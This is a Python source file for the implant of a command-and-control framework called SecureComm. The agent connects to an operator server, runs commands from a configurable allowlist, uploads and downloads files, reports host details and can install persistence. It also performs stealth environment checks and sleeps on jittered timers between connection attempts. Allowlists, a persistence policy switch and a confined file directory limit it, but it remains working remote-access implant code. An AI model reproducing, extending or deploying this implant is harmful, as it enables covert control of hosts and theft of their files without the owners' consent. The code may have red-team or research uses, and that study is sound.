"""
SecureComm Agent (Implant)
Connects to operator, executes commands, maintains stealth
"""

import socket
import json
import time
import base64
import hashlib
import logging
import os
import platform
import shlex
import shutil
import subprocess
import getpass
from pathlib import Path
from typing import Optional, Dict, Tuple

from cryptography import x509
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives.asymmetric import ed25519
from cryptography.x509.oid import NameOID

from .config import (
    AGENT_FILES_DIR,
    EXEC_ALLOWLIST,
    EXEC_MAX_OUTPUT_BYTES,
    EXEC_TIMEOUT,
    MAX_TRANSFER_BYTES,
    MAX_TRANSFER_PAYLOAD,
)
from .crypto_engine import CryptoEngine
from .message_utils import (
    COMMAND_SIGNATURE_FIELDS,
    HANDSHAKE_SIGNATURE_FIELDS,
    RESPONSE_SIGNATURE_FIELDS,
    ROTATION_REQUEST_SIGNATURE_FIELDS,
    ROTATION_RESPONSE_SIGNATURE_FIELDS,
    canonical_json,
    signature_payload,
)
from .network import (
    NetworkManager, 
    MSG_TYPE_HANDSHAKE, 
    MSG_TYPE_COMMAND, 
    MSG_TYPE_RESPONSE, 
    MSG_TYPE_KEY_ROTATION, 
    MSG_TYPE_HEARTBEAT
)
from .pki_manager import PKIManager
from .security import SecurityModule
from .persistence import PersistenceManager
from .stealth import StealthManager


class SecureAgent:
    """
    Agent/Implant for SecureComm C2
    
    Features:
    - Connects to operator securely
    - Validates operator certificates
    - Executes commands
    - Maintains connection with heartbeat
    - Implements reconnection logic
    """
    
    def __init__(
        self,
        agent_id: str,
        ca_cert_path: str,
        agent_cert_path: str,
        agent_key_path: str,
        server_host: str,
        server_port: int = 8443,
        sleep_interval: int = 5,
        expected_operator_id: Optional[str] = None,
        agent_key_password: Optional[bytes] = None,
    ):
        """
        Initialize Agent
        
        Args:
            agent_id: Unique agent identifier
            ca_cert_path: CA certificate for validation
            server_host: Operator server address
            server_port: Operator server port
            sleep_interval: Sleep between heartbeats (seconds)
        """
        self.agent_id = agent_id
        self.server_host = server_host
        self.server_port = server_port
        self.sleep_interval = sleep_interval
        self.expected_operator_id = expected_operator_id
        self.agent_cert_path = agent_cert_path
        self.agent_key_path = agent_key_path
        self.ca_cert_path = ca_cert_path
        
        # Initialize components
        self.crypto = CryptoEngine()
        self.network = NetworkManager(
            cert_path=agent_cert_path,
            key_path=agent_key_path,
            ca_cert_path=ca_cert_path,
        )
        self.security = SecurityModule()
        self.persistence = PersistenceManager()
        self.stealth = StealthManager()
        self.pki_manager = PKIManager(pki_path=self._resolve_pki_path())
        self.ca_certificate = self._load_ca_certificate()
        self.agent_files_dir = AGENT_FILES_DIR
        self.agent_files_dir.mkdir(parents=True, exist_ok=True)
        self.exec_allowlist = {cmd.lower() for cmd in EXEC_ALLOWLIST}

        self.agent_signing_key = self._load_agent_signing_key(agent_key_password)
        self.operator_public_key: Optional[ed25519.Ed25519PublicKey] = None
        self.operator_cert: Optional[x509.Certificate] = None
        
        self.session_key: Optional[bytes] = None
        self.running = False
        
        self.logger = logging.getLogger(__name__)
    
    def connect_to_operator(self) -> bool:
        """
        Establish secure connection to operator
        
        Returns:
            True if successful
        
        Workflow:
            1. TCP/TLS connection
            2. Certificate validation
            3. ECDH key exchange
            4. Session key derivation
        """
        try:
            # Connect via TLS
            self.sock = self.network.connect_to_server(
                self.server_host,
                self.server_port
            )
            
            # Get and validate operator certificate
            operator_cert = self.network.get_peer_certificate(self.sock)
            if not operator_cert:
                self.logger.error("❌ No operator certificate")
                return False
            
            # Validate certificate (CA + revocation + identity) and pin for MITM prevention
            self._validate_operator_certificate(operator_cert)
            self._validate_operator_identity(operator_cert)
            self.security.validate_pinned_certificate(self.agent_id, operator_cert)

            self.operator_cert = operator_cert
            self.operator_public_key = operator_cert.public_key()
            
            # Perform ECDH key exchange
            self._perform_key_exchange()
            
            self.logger.info(f"✅ Connected to operator: {self.server_host}:{self.server_port}")
            return True
            
        except Exception as e:
            self.logger.error(f"❌ Connection failed: {e}")
            return False
    
    def _perform_key_exchange(self):
        """
        ECDH key exchange with operator
        
        Workflow:
            1. Generate ephemeral ECDH keys
            2. Send public key to operator
            3. Receive operator's public key
            4. Derive shared secret
            5. Derive session key with HKDF
        """
        # Generate ECDH keys
        self.crypto.generate_ecdh_keypair()
        agent_public = self.crypto.serialize_ecdh_public_key()

        handshake = {
            "agent_id": self.agent_id,
            "ecdh_public_key": agent_public.hex(),
            "nonce": self.crypto.generate_nonce(),
            "timestamp": int(time.time()),
        }
        signature = self._sign_payload(handshake, HANDSHAKE_SIGNATURE_FIELDS)
        handshake["signature"] = signature.hex()

        # Send handshake with public key
        self.network.send_message(self.sock, MSG_TYPE_HANDSHAKE, handshake)

        # Receive operator's public key
        msg_type, response = self.network.receive_message(self.sock)
        if msg_type != MSG_TYPE_HANDSHAKE:
            raise ValueError("Unexpected handshake response type")
        self.security.validate_handshake(response)
        self._require_fields(response, HANDSHAKE_SIGNATURE_FIELDS)
        if str(response.get("agent_id")) != self.agent_id:
            raise ValueError("Handshake agent mismatch")
        self.security.validate_nonce(response["nonce"], response["timestamp"])
        self._verify_signature(response, response.get("signature"), HANDSHAKE_SIGNATURE_FIELDS)
        operator_public = bytes.fromhex(response["ecdh_public_key"])

        # Perform key exchange
        shared_secret = self.crypto.perform_key_exchange(operator_public)

        # Derive session key
        self.session_key = self.crypto.derive_session_key(shared_secret)

        self.logger.info("✅ Session key established")
    
    def run(self):
        """
        Main agent loop
        
        Workflow:
            1. Connect to operator
            2. Wait for commands
            3. Execute commands
            4. Send responses
            5. Maintain heartbeat
            6. Handle reconnection
        """
        self.running = True
        
        # Initial stealth check
        if not self.stealth.check_environment():
            self.logger.warning("Stealth checks failed on startup")
            # In a real scenario, might exit or go dormant. For now, we log.

        
        while self.running:
            try:
                # Connect if not connected
                if not hasattr(self, 'sock'):
                    if not self.connect_to_operator():
                        # Jittered sleep
                        self.stealth.random_sleep(self.sleep_interval, self.sleep_interval + 5)
                        continue
                
                # Wait for command (with timeout for heartbeat)
                self.sock.settimeout(self.sleep_interval)
                
                try:
                    msg_type, message = self.network.receive_message(self.sock)
                    
                    if msg_type == MSG_TYPE_COMMAND:
                        # Execute command
                        result = self._execute_command(message)

                        # Send response
                        self._send_response(result)
                    
                    elif msg_type == MSG_TYPE_KEY_ROTATION:
                        # Handle key rotation
                        self._handle_key_rotation(message)
                    
                except socket.timeout:
                    # Send heartbeat
                    self._send_heartbeat()
                
            except Exception as e:
                self.logger.error(f"❌ Error in agent loop: {e}")
                self._reconnect()
    
    def _execute_command(self, message: dict) -> dict:
        """
        Execute encrypted & signed command
        
        Args:
            message: Encrypted command message
        
        Returns:
            Command result dictionary
        """
        try:
            # Decrypt command
            encrypted_command = bytes.fromhex(message["encrypted_command"])
            decrypted = self.crypto.decrypt_message(encrypted_command, self.session_key)
            command = json.loads(decrypted)
            self.security.validate_command(command)
            self._require_fields(command, COMMAND_SIGNATURE_FIELDS)
            if not self.operator_public_key:
                raise ValueError("Operator public key unavailable")
            self._verify_signature(command, command.get("signature"), COMMAND_SIGNATURE_FIELDS)

            # Validate nonce (replay protection)
            self.security.validate_nonce(command["nonce"], command["timestamp"])

            # Execute based on type
            cmd_type = str(command["type"])
            is_transfer = cmd_type in {"upload", "download"}
            max_length = MAX_TRANSFER_PAYLOAD if is_transfer else 4096
            payload = self.security.sanitize_input(
                str(command["payload"]),
                max_length=max_length,
                allow_binary=is_transfer,
            )
            status, result = self._handle_command(cmd_type, payload)
            return self._build_response(command, status, result)

        except Exception as e:
            return self._build_response({"task_id": "unknown"}, "error", str(e))
    
    def _handle_command(self, cmd_type: str, payload: str) -> Tuple[str, object]:
        if cmd_type == "exec":
            return self._exec_safe_command(payload)
        if cmd_type == "upload":
            return self._handle_upload(payload)
        if cmd_type == "download":
            return self._handle_download(payload)
        if cmd_type == "status":
            return "success", self._status_snapshot()
        if cmd_type == "persist":
            if not self.persistence.is_allowed:
                self.logger.warning("Persistence attempt blocked by policy")
                return "denied", "persistence_policy_disabled"
            success = self.persistence.install_persistence()
            if success:
                return "success", "persistence_installed"
            return "error", "persistence_failed"
        if cmd_type == "sleep":
            self.sleep_interval = max(1, int(payload))
            return "success", f"Sleep interval set to {self.sleep_interval}s"
        if cmd_type == "exit":
            self.running = False
            return "success", "Agent exiting"
        return "error", f"Unknown command type: {cmd_type}"

    def _status_snapshot(self) -> Dict[str, object]:
        return {
            "agent_id": self.agent_id,
            "pid": os.getpid(),
            "user": getpass.getuser(),
            "cwd": os.getcwd(),
            "sleep_interval": self.sleep_interval,
            "server": f"{self.server_host}:{self.server_port}",
            "platform": platform.platform(),
            "timestamp": int(time.time()),
        }

    def _exec_safe_command(self, command: str) -> Tuple[str, object]:
        """Execute allowlisted command with strict validation and output limits."""
        try:
            tokens = shlex.split(command, posix=os.name != "nt")
        except ValueError as exc:
            return "error", f"invalid_command: {exc}"

        if not tokens:
            return "error", "empty_command"

        command_name = tokens[0].lower()
        if command_name not in self.exec_allowlist:
            return "denied", "command_not_allowed"

        if any(any(char in token for char in ";|&<>") for token in tokens):
            return "denied", "invalid_characters"

        if command_name == "echo":
            return "success", " ".join(tokens[1:])

        resolved = shutil.which(command_name)
        if not resolved:
            return "error", "command_not_found"

        try:
            result = subprocess.run(
                [resolved, *tokens[1:]],
                capture_output=True,
                text=True,
                timeout=EXEC_TIMEOUT,
                check=False,
                cwd=str(self.agent_files_dir),
            )
        except subprocess.TimeoutExpired:
            return "error", "exec_timeout"
        except Exception as exc:
            return "error", f"exec_failed: {exc}"

        output = (result.stdout or "") + (result.stderr or "")
        output_bytes = output.encode("utf-8", errors="replace")
        if len(output_bytes) > EXEC_MAX_OUTPUT_BYTES:
            output_bytes = output_bytes[:EXEC_MAX_OUTPUT_BYTES]
            output = output_bytes.decode("utf-8", errors="replace") + " ...[truncated]"
        output = output.strip() or "(no output)"

        if result.returncode != 0:
            return "error", f"exit_code={result.returncode} output={output}"
        return "success", output
    
    def _send_response(self, result: dict):
        """Send encrypted response to operator"""
        response_json = canonical_json(result)
        encrypted = self.crypto.encrypt_message(response_json, self.session_key)

        self.network.send_message(self.sock, MSG_TYPE_RESPONSE, {
            "encrypted_response": encrypted.hex()
        })
    
    def _send_heartbeat(self):
        """Send heartbeat to operator"""
        self.network.send_message(self.sock, MSG_TYPE_HEARTBEAT, {
            "agent_id": self.agent_id,
            "timestamp": int(time.time())
        })
    
    def _reconnect(self):
        """Reconnect to operator"""
        self.logger.info("🔄 Reconnecting...")
        try:
            self.sock.close()
        except (OSError, AttributeError) as e:
            self.logger.debug(f"Error closing socket during reconnect: {e}")
        delattr(self, 'sock')
        time.sleep(self.sleep_interval)
    
    def stop(self):
        """Stop agent"""
        self.running = False
        if hasattr(self, 'sock'):
            self.sock.close()

    def _build_response(self, command: Dict[str, object], status: str, result: object) -> Dict[str, object]:
        response = {
            "task_id": str(command.get("task_id", "")),
            "agent_id": self.agent_id,
            "status": status,
            "result": result,
            "nonce": self.crypto.generate_nonce(),
            "timestamp": int(time.time()),
        }
        signature = self._sign_payload(response, RESPONSE_SIGNATURE_FIELDS)
        response["signature"] = signature.hex()
        return response

    def _handle_key_rotation(self, message: dict) -> None:
        self.security.validate_rotation_request(message)
        self._require_fields(message, ROTATION_REQUEST_SIGNATURE_FIELDS)
        if not self.operator_public_key:
            raise ValueError("Operator public key unavailable")
        if str(message.get("agent_id")) != self.agent_id:
            raise ValueError("Rotation agent mismatch")
        self.security.validate_nonce(message["nonce"], message["timestamp"])
        self._verify_signature(message, message.get("signature"), ROTATION_REQUEST_SIGNATURE_FIELDS)

        operator_public = bytes.fromhex(str(message["ecdh_public_key"]))
        self.crypto.generate_ecdh_keypair()
        agent_public = self.crypto.serialize_ecdh_public_key()
        shared_secret = self.crypto.perform_key_exchange(operator_public)
        new_session_key = self.crypto.derive_session_key(shared_secret)

        response = {
            "rotation_id": str(message["rotation_id"]),
            "agent_id": self.agent_id,
            "ecdh_public_key": agent_public.hex(),
            "nonce": self.crypto.generate_nonce(),
            "timestamp": int(time.time()),
        }
        signature = self._sign_payload(response, ROTATION_RESPONSE_SIGNATURE_FIELDS)
        response["signature"] = signature.hex()
        self.network.send_message(self.sock, MSG_TYPE_KEY_ROTATION, response)
        self.session_key = new_session_key
        self.logger.info("🔄 Session key rotated")

    def _handle_upload(self, payload: str) -> Tuple[str, object]:
        try:
            data = json.loads(payload)
        except json.JSONDecodeError:
            return "error", "invalid_upload_payload"

        if not isinstance(data, dict):
            return "error", "invalid_upload_payload"

        path_value = data.get("path")
        data_value = data.get("data")
        sha256_value = data.get("sha256")
        size_value = data.get("size")

        if not isinstance(path_value, str) or not path_value:
            return "error", "invalid_upload_path"
        if not isinstance(data_value, str):
            return "error", "invalid_upload_data"
        if not isinstance(sha256_value, str) or len(sha256_value) != 64:
            return "error", "invalid_upload_checksum"
        if not isinstance(size_value, int) or size_value < 0:
            return "error", "invalid_upload_size"
        if size_value > MAX_TRANSFER_BYTES:
            return "denied", "upload_size_exceeded"
        if size_value > 0 and not data_value:
            return "error", "invalid_upload_data"

        try:
            raw_bytes = base64.b64decode(data_value, validate=True)
        except Exception as exc:
            return "error", f"invalid_upload_base64: {exc}"

        if len(raw_bytes) != size_value:
            return "error", "upload_size_mismatch"
        if len(raw_bytes) > MAX_TRANSFER_BYTES:
            return "denied", "upload_size_exceeded"

        checksum = hashlib.sha256(raw_bytes).hexdigest()
        if checksum != sha256_value:
            return "error", "upload_checksum_mismatch"

        try:
            destination = self._resolve_agent_path(path_value)
        except ValueError as exc:
            return "error", f"invalid_upload_path: {exc}"

        destination.parent.mkdir(parents=True, exist_ok=True)
        destination.write_bytes(raw_bytes)
        try:
            os.chmod(destination, 0o600)
        except Exception:
            pass

        relative_path = destination.relative_to(self.agent_files_dir).as_posix()
        return "success", {"path": relative_path, "size": size_value, "sha256": checksum}

    def _handle_download(self, payload: str) -> Tuple[str, object]:
        try:
            data = json.loads(payload)
        except json.JSONDecodeError:
            return "error", "invalid_download_payload"

        if not isinstance(data, dict):
            return "error", "invalid_download_payload"

        path_value = data.get("path")
        if not isinstance(path_value, str) or not path_value:
            return "error", "invalid_download_path"

        try:
            source = self._resolve_agent_path(path_value)
        except ValueError as exc:
            return "error", f"invalid_download_path: {exc}"

        if not source.exists() or not source.is_file():
            return "error", "download_not_found"

        file_size = source.stat().st_size
        if file_size > MAX_TRANSFER_BYTES:
            return "denied", "download_size_exceeded"

        raw_bytes = source.read_bytes()
        checksum = hashlib.sha256(raw_bytes).hexdigest()
        encoded = base64.b64encode(raw_bytes).decode("utf-8")

        if len(encoded) > MAX_TRANSFER_PAYLOAD:
            return "denied", "download_payload_exceeds_limit"

        relative_path = source.relative_to(self.agent_files_dir).as_posix()
        return "success", {
            "path": relative_path,
            "size": file_size,
            "sha256": checksum,
            "data": encoded,
        }

    def _load_agent_signing_key(self, password: Optional[bytes]) -> ed25519.Ed25519PrivateKey:
        key_bytes = Path(self.agent_key_path).read_bytes()
        return self.crypto.load_signing_private_key(key_bytes, password=password)

    def _load_ca_certificate(self) -> x509.Certificate:
        cert_bytes = Path(self.ca_cert_path).read_bytes()
        return x509.load_pem_x509_certificate(cert_bytes, default_backend())

    def _validate_operator_certificate(self, certificate: x509.Certificate) -> None:
        """Validate operator certificate using unified validation method"""
        expected_cn = self.expected_operator_id if self.expected_operator_id else None
        self.pki_manager.validate_certificate_unified(
            certificate,
            self.ca_certificate,
            expected_cn=expected_cn,
            expected_type="operator",
            require_db_registration=True
        )

    def _validate_operator_identity(self, certificate: x509.Certificate) -> None:
        """Deprecated - validation now unified in _validate_operator_certificate"""
        if not self.expected_operator_id:
            return
        cn = certificate.subject.get_attributes_for_oid(NameOID.COMMON_NAME)[0].value
        if cn != self.expected_operator_id:
            raise ValueError("Operator identity mismatch")

    def _resolve_pki_path(self) -> str:
        ca_path = Path(self.ca_cert_path)
        if len(ca_path.parents) >= 2:
            return str(ca_path.parents[1])
        return str(ca_path.parent)

    def _resolve_agent_path(self, raw_path: str) -> Path:
        base = self.agent_files_dir.resolve()
        candidate = Path(raw_path)
        if not candidate.is_absolute():
            candidate = (base / candidate).resolve()
        else:
            candidate = candidate.resolve()
        if candidate == base or base in candidate.parents:
            return candidate
        raise ValueError("path_outside_agent_directory")

    def _require_fields(self, payload: Dict[str, object], fields: Tuple[str, ...]) -> None:
        missing = [field for field in fields if field not in payload]
        if missing:
            raise ValueError(f"Missing fields: {', '.join(missing)}")

    def _sign_payload(self, payload: Dict[str, object], fields: Tuple[str, ...]) -> bytes:
        data = signature_payload(payload, fields)
        return self.crypto.sign_data(data, self.agent_signing_key)

    def _verify_signature(
        self,
        payload: Dict[str, object],
        signature_hex: Optional[object],
        fields: Tuple[str, ...],
    ) -> None:
        if not isinstance(signature_hex, str):
            raise ValueError("Missing signature")
        signature = bytes.fromhex(signature_hex)
        data = signature_payload(payload, fields)
        if not self.operator_public_key or not self.crypto.verify_signature(
            data, signature, self.operator_public_key
        ):
            raise ValueError("Invalid signature")


# Entry point
if __name__ == "__main__":
    import argparse
    
    parser = argparse.ArgumentParser(description='SecureComm Agent')
    parser.add_argument('--agent-id', required=True, help='Agent identifier')
    parser.add_argument('--server', required=True, help='Operator server address')
    parser.add_argument('--port', type=int, default=8443, help='Server port')
    parser.add_argument('--ca-cert', required=True, help='CA certificate path')
    parser.add_argument('--agent-cert', required=True, help='Agent certificate path')
    parser.add_argument('--agent-key', required=True, help='Agent private key path')
    parser.add_argument('--operator-id', required=False, help='Expected operator common name')
    parser.add_argument('--agent-key-password', required=False, help='Agent key password')
    
    args = parser.parse_args()
    
    agent_key_password = args.agent_key_password.encode("utf-8") if args.agent_key_password else None

    agent = SecureAgent(
        agent_id=args.agent_id,
        ca_cert_path=args.ca_cert,
        agent_cert_path=args.agent_cert,
        agent_key_path=args.agent_key,
        server_host=args.server,
        server_port=args.port,
        expected_operator_id=args.operator_id,
        agent_key_password=agent_key_password,
    )
    
    try:
        agent.run()
    except KeyboardInterrupt:
        print("\n🛑 Agent stopped")
        agent.stop()